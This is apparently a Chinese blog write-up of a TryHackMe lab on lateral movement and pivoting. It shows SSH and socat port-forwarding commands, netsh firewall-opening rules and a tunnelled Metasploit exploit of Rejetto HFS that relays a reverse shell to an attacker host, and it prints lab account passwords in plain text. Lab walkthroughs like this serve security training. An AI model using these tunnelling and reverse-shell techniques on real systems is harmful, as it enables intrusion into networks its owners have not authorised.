<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216203227640.png" alt="image-20240216203227640"></p>
<p>此时可能会出现的一个有效问题是，如果我们已经破坏了 PC-1 并且可以直接从那里运行 RDP 会话，为什么我们需要端口转发。答案很简单：在我们只能通过控制台访问 PC-1 的情况下，我们将无法使用任何 RDP 客户端，因为我们没有 GUI。通过使攻击者的计算机可以使用该端口，您可以使用 Linux RDP 客户端进行连接。当您想要针对无法直接访问的端口运行漏洞利用时，会出现类似的情况，因为您的漏洞利用可能需要特定的脚本语言，而这种语言可能并不总是在您妥协的计算机上可用。</p>
<p>参考上图，要将服务器上的端口 3389 转发回攻击者的计算机，我们可以在 PC-1 上使用以下命令：</p>
<pre><code class="hljs scss">C:\&gt; ssh tunneluser@<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span> -R <span class="hljs-number">3389</span>:<span class="hljs-number">3.3</span>.<span class="hljs-number">3.3</span>:<span class="hljs-number">3389</span> -N</code></pre>
<p>This will establish an SSH session from PC-1 to <code>1.1.1.1</code> (Attacker PC) using the <code>tunneluser</code> user.<br>
这将使用 <code>tunneluser</code> 用户建立从 PC-1 到 <code>1.1.1.1</code> （攻击者 PC）的 SSH 会话。</p>
<p>由于 <code>tunneluser</code> 不允许在攻击者PC上运行shell，因此我们需要使用 <code>-N</code> 开关运行 <code>ssh</code> 命令以防止客户端请求一个，否则连接将立即退出。 <code>-R</code> 开关用于请求远程端口转发，语法要求我们首先指示将在 SSH 服务器上打开的端口 (3389)，后跟冒号，然后是 IP 和端口我们将转发的套接字的名称 (3.3.3.3:3389)。请注意，端口号不需要匹配，但在本示例中需要匹配。</p>
<p>命令本身不会输出任何内容，但隧道将取决于要运行的命令。无论何时，我们都可以像使用任何其他命令一样按 CTRL+C 来关闭隧道。</p>
<p>一旦我们的隧道设置并运行，我们就可以访问攻击者的计算机并通过 RDP 进入转发端口来到达服务器：</p>
<pre><code class="hljs scss">munra<span class="hljs-keyword">@attacker-pc</span>$ xfreerdp /<span class="hljs-attribute">v</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> /<span class="hljs-attribute">u</span>:MyUser /<span class="hljs-attribute">p</span>:MyPassword</code></pre>
<h2 id="ssh-本地端口转发">SSH 本地端口转发</h2>
<p>本地端口转发允许我们将端口从 SSH 服务器“拉”到 SSH 客户端。在我们的场景中，这可用于获取攻击者计算机中可用的任何服务，并通过 PC-1 上的端口使其可用。这样，任何无法直接连接到攻击者 PC 但可以连接到 PC-1 的主机现在都可以通过枢轴主机访问攻击者的服务。</p>
<p>使用这种类型的端口转发将允许我们从通常无法连接回我们的主机上运行反向 shell，或者仅仅是使我们想要的任何服务对于没有直接连接到我们的机器的机器可用。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204345929.png" alt="image-20240216204345929"></p>
<p>要从攻击者的计算机转发端口 80 并使其可从 PC-1 访问，我们可以在 PC-1 上运行以下命令：</p>
<pre><code class="hljs scss">ssh tunneluser@<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span> -L *:<span class="hljs-number">80</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span> -N</code></pre>
<p>该命令结构与远程端口转发中使用的命令结构类似，但使用 <code>-L</code> 选项进行本地端口转发。此选项要求我们指示 PC-1 用于接收连接的本地套接字 ( <code>*:80</code> ) 以及从攻击者的 PC 角度连接的远程套接字 ( <code>127.0.0.1:80</code> )。</p>
<p>请注意，我们在第二个套接字中使用 IP 地址 127.0.0.1，从攻击者的 PC 角度来看，这是持有要转发的端口 80 的主机。</p>
<p>由于我们在 PC-1 上打开一个新端口，因此我们可能需要添加防火墙规则以允许传入连接（使用 <code>dir=in</code> ）。为此需要管理权限：</p>
<pre><code class="hljs scss">netsh advfirewall firewall add rule name="Open Port <span class="hljs-number">80</span>" dir=in action=allow protocol=TCP localport=<span class="hljs-number">80</span></code></pre>
<p>设置隧道后，任何将浏览器指向 <code>http://2.2.2.2:80</code> 的 PC-1 的用户都会看到攻击者计算机发布的网站。</p>
<h2 id="使用-socat-进行端口转发">使用 socat 进行端口转发</h2>
<p>在 SSH 不可用的情况下，socat 可用于执行类似的功能。虽然不如 SSH 灵活，但 socat 允许您以更简单的方式转发端口。使用 socat 的缺点之一是我们需要将其传输到枢轴主机（在我们当前的示例中为 PC-1），使其比 SSH 更容易被检测到，但在没有其他选项可用的情况下可能值得一试。</p>
<p>使用 socat 执行端口转发的基本语法要简单得多。如果我们想打开主机上的端口 1234 并将我们收到的任何连接转发到主机 1.1.1.1 上的端口 4321，您将使用以下命令：</p>
<pre><code class="hljs scss">socat TCP4-LISTEN:<span class="hljs-number">1234</span>,fork TCP4:<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>:<span class="hljs-number">4321</span></code></pre>
<p><code>fork</code> 选项允许 socat 为收到的每个连接创建一个新进程，从而可以在不关闭的情况下处理多个连接。如果不包含它，socat 将在第一个连接完成时关闭。</p>
<p>回到我们的示例，如果我们想像使用 SSH 远程端口转发一样使用 PC-1 作为枢纽来访问服务器上的端口 3389，我们可以使用以下命令：</p>
<pre><code class="hljs scss">C:\&gt;socat TCP4-LISTEN:<span class="hljs-number">3389</span>,fork TCP4:<span class="hljs-number">3.3</span>.<span class="hljs-number">3.3</span>:<span class="hljs-number">3389</span></code></pre>
<p>请注意，socat 无法像 SSH 那样将连接直接转发到攻击者的计算机，但会在 PC-1 上打开一个端口，攻击者的计算机随后可以连接到该端口：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204530374.png" alt="image-20240216204530374"></p>
<p>像往常一样，由于在枢轴主机上打开了一个端口，我们可能需要创建一个防火墙规则以允许到该端口的任何连接：</p>
<pre><code class="hljs scss">netsh advfirewall firewall add rule name="Open Port <span class="hljs-number">3389</span>" dir=in action=allow protocol=TCP localport=<span class="hljs-number">3389</span></code></pre>
<p>另一方面，如果我们想从攻击者的机器公开端口 80，以便服务器可以访问它，我们只需要稍微调整一下命令：</p>
<pre><code class="hljs scss">C:\&gt;socat TCP4-LISTEN:<span class="hljs-number">80</span>,fork TCP4:<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>:<span class="hljs-number">80</span></code></pre>
<p>结果，PC-1 将生成端口 80 并侦听要转发到攻击者计算机上的端口 80 的连接：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204552262.png" alt="image-20240216204552262"></p>
<h2 id="动态端口转发和-socks">动态端口转发和 SOCKS</h2>
<p>虽然单端口转发对于需要访问特定套接字的任务非常有效，但有时我们可能需要通过枢轴主机对主机的许多端口甚至跨多台计算机的许多端口运行扫描。在这些情况下，动态端口转发允许我们通过主机进行旋转，并使用 SOCKS 代理与我们想要的任何 IP 地址/端口建立多个连接。</p>
<p>由于我们不想依赖目标网络中 Windows 计算机上现有的 SSH 服务器，因此我们通常会使用 SSH 客户端通过以下命令建立反向动态端口转发：</p>
<pre><code class="hljs scss">C:\&gt; ssh tunneluser@<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span> -R <span class="hljs-number">9050</span> -N</code></pre>
<p>在这种情况下，SSH 服务器将在端口 <code>9050</code> 上启动 SOCKS 代理，并通过 SSH 隧道转发任何连接请求，最终由 SSH 客户端代理。</p>
<p>最有趣的部分是，我们可以使用代理链通过 SOCKS 代理轻松使用我们的任何工具。为此，我们首先需要确保 proxychains 正确配置为将任何连接指向 SOCKS 代理服务器的 SSH 使用的同一端口。 proxychains 配置文件可以在 AttackBox 上的 <code>/etc/proxychains.conf</code> 处找到。如果我们向下滚动到配置文件的末尾，我们应该看到一行指示用于袜子代理的端口：</p>
<pre><code class="hljs scss"><span class="hljs-selector-attr">[ProxyList]</span>
socks4  <span class="hljs-number">127.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span> <span class="hljs-number">9050</span></code></pre>
<p>默认端口是 9050，但是只要与我们建立 SSH 隧道时使用的端口匹配，任何端口都可以工作。</p>
<p>如果我们现在想通过代理执行任何命令，我们可以使用代理链：</p>
<pre><code class="hljs scss">proxychains curl http://pxeboot.za.tryhackme.com</code></pre>
<p>请注意，某些软件（例如 nmap）在某些情况下可能无法与 SOCKS 很好地配合，并且可能显示不同的结果，因此您的情况可能会有所不同。</p>
<h2 id="实践练习">实践练习</h2>
<p>注意：由于您将使用 <code>tunneluser</code> 执行从实验室网络到攻击者计算机的 SSH 连接，因此我们强烈建议您使用 Attackbox 或虚拟机，而不是您的实际计算机。已给出有关创建不允许通过 SSH/SCP 运行命令或传输文件的用户的说明，因此请务必按照提供的说明进行操作。还建议为 <code>tunneluser</code> 创建一个强密码，并确保它是唯一且可丢弃的密码，而不是您在此或任何其他平台中的实际密码。</p>
<p>要完成此练习，您需要使用在任务 1 中从 <a target="_blank" rel="noopener" href="http://distributor.za.tryhackme.com/creds">http://distributor.za.tryhackme.com/creds</a> 分配给您的凭据连接到 THMJMP2。如果您还没有这样做，请单击链接并立即获取凭据。获得凭据后，通过 SSH 连接到 THMJMP2：</p>
<pre><code class="hljs scss">ssh za\\tony<span class="hljs-selector-class">.holland</span><span class="hljs-keyword">@thmjmp</span>2.za.tryhackme.com
    //密码为：Mhvn2334</code></pre>
<p>我们的第一个目标是通过 RDP 连接到 THMIIS。如果我们尝试直接从攻击者计算机进行连接，我们会发现端口 3389 已通过防火墙过滤，因此无法直接使用。但是，该端口已启动并正在运行，但只能从 THMJMP2 访问。通过使用 THMJMP2 上 <code>C:\tools\socat\</code> 上提供的 socat，我们将转发 RDP 端口，使其在 THMJMP2 上可用于从攻击者的计算机进行连接。</p>
<p>为此，我们将使用以下参数运行 socat：</p>
<pre><code class="hljs scss">C:\tools\socat\&gt;socat TCP4-LISTEN:<span class="hljs-number">3697</span>,fork TCP4:THMIIS.za.tryhackme.com:<span class="hljs-number">3389</span></code></pre>
<p>请注意，我们不能将端口 3389 用于侦听器，因为它已在 THMJMP2 中用于其自己的 RDP 服务。请随意将侦听器端口 (13389) 更改为其他号码，以避免与其他学生发生冲突。在典型设置中，您必须添加防火墙规则以允许流量通过侦听器端口，但为了方便起见，THMJMP2 已禁用其防火墙。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205715457.png" alt="image-20240216205715457"></p>
<p>设置侦听器后，您应该能够通过 THMJMP2 处的 socat 侦听器通过 RDP 从攻击者计算机连接到 THMIIS：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@AttackBox</span>$ xfreerdp /<span class="hljs-attribute">v</span>:THMJMP2.za.tryhackme.<span class="hljs-attribute">com</span>:<span class="hljs-number">3697</span> /<span class="hljs-attribute">u</span>:t1_thomas.moore /<span class="hljs-attribute">p</span>:MyPazzw3rd2020</code></pre>
<p>连接后，您应该会从 THMIIS 上的 t1_thomas.moore 桌面上获得一个标志。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205818932.png" alt="image-20240216205818932"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205806238.png" alt="image-20240216205806238"></p>
<h3 id="隧道复杂漏洞">隧道复杂漏洞</h3>
<p>THMDC 服务器正在运行 Rejetto HFS 的易受攻击版本。我们面临的问题是防火墙规则限制对易受攻击的端口的访问，因此只能从 THMJMP2 进行查看。此外，来自 THMDC 的出站连接仅允许其本地网络中的计算机进行，因此无法直接接收到攻击者计算机的反向 shell。更糟糕的是，Rejetto HFS 漏洞要求攻击者托管 HTTP 服务器来触发最终有效负载，但由于攻击者的计算机不允许出站连接，因此我们需要找到一种方法来托管 Web 服务器之一同一网络中的其他机器，这一点也不方便。我们可以使用端口转发来克服所有这些问题。</p>
<p>首先，让我们看看该漏洞利用程序是如何工作的。首先，它将连接到 HFS 端口（Metasploit 中的 <code>RPORT</code> ）以触发第二个连接。第二个连接将在 <code>SRVPORT</code> 上针对攻击者的计算机进行，其中 Web 服务器将传递最终的有效负载。最后，攻击者的有效负载将在 <code>LPORT</code> 上执行并向攻击者发送回反向 shell：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205954150.png" alt="image-20240216205954150"></p>
<p>考虑到这一点，我们可以使用 SSH 将某些端口从攻击者的计算机转发到 THMJMP2（用于 Web 服务器的 SRVPORT 和用于接收反向 shell 的 LPORT），并通过 THMJMP2 到达 THMDC 上的 RPORT。我们需要在两个方向上进行三个端口转发，以便所有漏洞利用的交互都可以通过 THMJMP2 进行代理：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216210148593.png" alt="image-20240216210148593"></p>
<p>Rejetto HFS 将侦听 THMDC 上的端口 80，因此我们需要使用远程端口转发通过 THMJMP2 将该端口隧道传回攻击者的计算机。由于攻击盒的 80 端口已被其他服务占用，因此我们需要将 THMDC 上的端口 80 与攻击盒当前未使用的某个端口链接起来。让我们使用端口 8888。在 THMJMP2 中运行 ssh 来转发此端口时，我们必须将 <code>-R 8888:thmdc.za.tryhackme.com:80</code> 添加到我们的命令中。</p>
<p>对于SRVPORT和LPORT，我们随意选择两个随机端口。出于演示目的，我们将设置 <code>SRVPORT=6666</code> 和 <code>LPORT=7878</code> ，但请务必使用不同的端口，因为实验室与其他学生共享，因此如果你们两个选择相同的端口，当尝试转发它们时，您会收到一条错误消息，指出此类端口已在 THMJMP2 上使用。</p>
<p>要将此类端口从攻击者计算机转发到 THMJMP2，我们将通过在 ssh 命令中添加 <code>-L *:6666:127.0.0.1:6666</code> 和 <code>-L *:7878:127.0.0.1:7878</code> 来使用本地端口转发。这将绑定 THMJMP2 上的两个端口，并将任何连接隧道返回到我们的攻击者计算机。</p>
<p>将整个命令放在一起，我们最终会得到以下结果：</p>
<pre><code class="hljs scss">C:\&gt; ssh tunneluser@<span class="hljs-number">10.50</span>.<span class="hljs-number">46.236</span> -R <span class="hljs-number">8888</span>:thmdc.za.tryhackme.com:<span class="hljs-number">80</span> -L *:<span class="hljs-number">6666</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6666</span> -L *:<span class="hljs-number">7878</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">7878</span> -N</code></pre>
<p>注意：如果您使用 AttackBox 并且之前加入过其他网络房间，请务必选择分配给面向 <code>lateralmovementandpivoting</code> 网络的隧道接口的 IP 地址作为您的 ATTACKER_IP，否则您的反向 shell/连接将获胜无法正常工作。为了您的方便，连接到该网络的接口称为 <code>lateralmovement</code> ，因此您应该能够通过运行 <code>ip add show lateralmovement</code> 获得正确的 IP 地址：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216210318888.png" alt="image-20240216210318888"></p>
<p>一旦所有端口转发到位，我们就可以启动 Metasploit 并配置漏洞利用程序，以便所需的端口与我们通过 THMJMP2 转发的端口相匹配：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/3a9b9b89b41c2382a2c8645ab1c01a2f0e640df2/images/image-20240217120311538.png" alt="images/image-20240217120311538.png  0 → 100644"></p>
<p>这里有很多东西需要解压：</p>
<ul>
<li>LHOST参数通常有两个用途：作为攻击者机器上绑定监听器的IP，用于接收反向shell；它还嵌入在有效负载中，以便受害者知道在触发漏洞时从哪里进行连接。在我们的特定场景中，由于 THMDC 无法联系到我们，因此我们需要强制有效负载连接回 THMJMP2，但我们需要侦听器在 <code>127.0.0.1</code> 上绑定到攻击者的计算机。为此，Metasploit 提供了一个可选参数 <code>ReverseListenerBindAddress</code> ，该参数可用于指定攻击者机器上侦听器的绑定地址，与负载将连接回的地址分开。在我们的示例中，我们希望将反向 shell 侦听器绑定到攻击者计算机上的 127.0.0.1，并将有效负载连接回 THMJMP2（因为它将通过 SSH 隧道转发到攻击者计算机）。</li>
<li>我们的漏洞还必须运行一个 Web 服务器来托管并将最终有效负载发送回受害者服务器。我们使用 SRVHOST 来指示监听地址，在本例中为 127.0.0.1，以便攻击者机器将 Web 服务器绑定到 localhost。虽然这可能违反直觉，因为没有外部主机能够指向攻击者的计算机本地主机，但 SSH 隧道将负责将 SRVPORT 处 THMJMP2 上收到的任何连接转发回攻击者的计算机。</li>
<li>RHOSTS 设置为指向 127.0.0.1，因为 SSH 隧道将通过使用 THMJMP2 建立的 SSH 隧道将请求转发到 THMDC。 RPORT 设置为 8888，因为发送到攻击者计算机上该端口的任何连接都将转发到 THMDC 上的端口 80。</li>
</ul>
<p>启动该漏洞后，您将在攻击者的计算机上收到一个 shell。您会在 <code>C:\hfs\flag.txt</code> 上找到一个标志。</p>
<h1 id="0x08-参考文章">0x08 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://benheater.com/tryhackme-lateral-movement-pivoting/">TryHackMe | Lateral Movement &amp; Pivoting</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/02/16/thm-lateral-movement-and-pivoting/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/02/16/thm-lateral-movement-and-pivoting/')">THM-Lateral Movement and Pivoting</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/02/16/thm-lateral-movement-and-pivoting/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-Lateral Movement and Pivoting&amp;url=http://hybcx.xyz/2024/02/16/thm-lateral-movement-and-pivoting/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">42</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/02/14/thm-basic-pentesting/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-Basic Pentesting</div></div></a></div><div class="next-post pull-right"><a href="/2024/02/16/thm-nmap/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM-Nmap</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-08</div><div class="title">THM-ByPass_UAC</div></div></a></div><div><a href="/2024/06/17/thm-corp/" title="THM-Corp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-17</div><div class="title">THM-Corp</div></div></a></div><div><a href="/2024/07/10/thm-c2-jian-jie/" title="THM-C2简介"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-10</div><div class="title">THM-C2简介</div></div></a></div><div><a href="/2024/06/09/thm-enumerating-active-directory/" title="THM-Enumerating Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-09</div><div class="title">THM-Enumerating Active Directory</div></div></a></div><div><a href="/2024/06/16/thm-hacking-with-powershell/" title="THM-Hacking_With_PowerShell"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-16</div><div class="title">THM-Hacking_With_PowerShell</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87"><span class="toc-number">1.1.</span> <span class="toc-text">学习目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 